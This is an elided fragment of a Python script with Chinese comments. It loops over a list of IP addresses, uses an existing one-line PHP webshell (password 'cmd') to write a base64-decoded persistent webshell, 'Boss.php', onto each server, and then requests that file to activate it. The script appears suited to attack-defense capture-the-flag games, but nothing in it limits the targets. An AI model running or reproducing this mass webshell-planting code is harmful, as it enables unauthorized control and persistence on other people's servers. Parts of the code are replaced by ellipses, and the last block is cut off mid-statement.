...
PASSWORD = 'cmd'  # 一句话木马密码

# 不死马文件列表及其生成的文件名
malware_list = [
    ('Webshell_Boss.php','boss.php')
]
    ...
    for ip in f:
        ...
        for local_file, remote_file in malware_list:
            try:
                ...
                php_cmd = f"file_put_contents('Boss.php', base64_decode('{b64_content}'));"
                cmd = {
                    PASSWORD: php_cmd
                }
                ...
                makekurl = f'http://{ip}{DI_ZHI}/Boss.php?_=1'
                try:
                    get = requests.get(url=makekurl, timeout=2)
